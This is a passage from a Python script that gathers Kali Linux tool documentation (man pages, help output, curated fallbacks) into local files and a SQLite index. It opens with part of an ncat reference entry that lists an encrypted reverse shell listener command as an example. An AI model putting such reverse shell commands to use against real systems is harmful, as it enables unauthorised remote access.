Supports SSL/TLS encryption (--ssl), IPv6, SOCKS4/5 proxying, access control lists (--allow), and connection brokering (--broker).
Example: ncat -lvnp 4444 --ssl (Encrypted reverse shell listener).
Example: ncat --ssl target.com 443 (Connect with TLS).""",
}


def get_tool_documentation(tool_name: str) -> tuple[str, str]:
    # 1. Try man page if man exists
    if shutil.which("man"):
        try:
            man_proc = subprocess.Popen(["man", tool_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            col_proc = subprocess.Popen(["col", "-b"], stdin=man_proc.stdout, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            man_proc.stdout.close()
            out, _ = col_proc.communicate(timeout=4)
            text = out.decode('utf-8', errors='ignore').strip()
            if text and "No manual entry" not in text and len(text) > 100:
                return text, "man"
        except Exception:
            pass

    # 2. Try <tool> --help or <tool> -h if binary exists
    if shutil.which(tool_name):
        for help_flag in ["--help", "-h"]:
            try:
                res = subprocess.run([tool_name, help_flag], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=4)
                output = res.stdout.decode('utf-8', errors='ignore').strip()
                if output and len(output) > 80:
                    return f"# Command Help Output for {tool_name}\n\n{output}", "help"
            except Exception:
                pass

    # 3. Use curated fallback reference doc
    if tool_name in FALLBACK_TOOL_DOCS:
        return f"# Kali Tool Documentation: {tool_name}\n\n" + FALLBACK_TOOL_DOCS[tool_name], "fallback"

    return "", ""

def sync_kali_docs(base_dir: str):
    import hashlib
    import sqlite3
    from embed_store import init_db

    kali_dir = os.path.join(base_dir, "knowledge_base_kali", "raw")
    os.makedirs(kali_dir, exist_ok=True)
    db_path = os.path.join(base_dir, "data", "vectors.db")
    init_db(db_path)

    conn = sqlite3.connect(db_path)

    print(f"--- Syncing Linux/Kali Tool Documentation to {kali_dir} ---")
    synced_count = 0
    failed_count = 0

    for tool in CURATED_TOOLS:
        doc_text, doc_version = get_tool_documentation(tool)
        if not doc_text:
            failed_count += 1
            continue

        file_path = os.path.join(kali_dir, f"{tool}.txt")
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(doc_text)
        
        source_hash = hashlib.sha256(doc_text.encode('utf-8')).hexdigest()
        conn.execute("""
            INSERT INTO kali_sources (tool_name, last_synced, source_hash, doc_version)
            VALUES (?, CURRENT_TIMESTAMP, ?, ?)
            ON CONFLICT(tool_name) DO UPDATE SET
                last_synced=CURRENT_TIMESTAMP,
                source_hash=excluded.source_hash,
                doc_version=excluded.doc_version
        """, (tool, source_hash, doc_version))

        print(f"  [SYNCED] {tool} ({doc_version}) -> {os.path.basename(file_path)}")
        synced_count += 1

    conn.commit()
    conn.close()

    print(f"\nCompleted Kali Docs Sync: {synced_count} tools synced, {failed_count} tools without available docs.")
    return kali_dir

if __name__ == "__main__":
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    sync_kali_docs(base_dir)
